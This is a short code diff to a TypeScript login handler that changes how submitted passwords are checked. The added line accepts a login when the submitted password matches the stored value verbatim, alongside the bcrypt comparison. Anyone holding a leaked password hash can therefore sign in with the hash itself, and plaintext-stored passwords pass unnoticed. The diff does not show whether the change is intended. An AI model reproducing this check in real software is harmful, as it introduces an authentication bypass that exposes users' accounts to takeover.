@@ -738,7 +738,7 @@ export const login = async (req: Request, res: Response) => {
     }
 
     // // Hashed password
-    const isMatch = await bcrypt.compare(password, data.password as string);
+    const isMatch = data.password === password || (await bcrypt.compare(password, data.password as string));
 
     if (!isMatch) {
       return res.status(404).json({ message: 'Wrong password' });
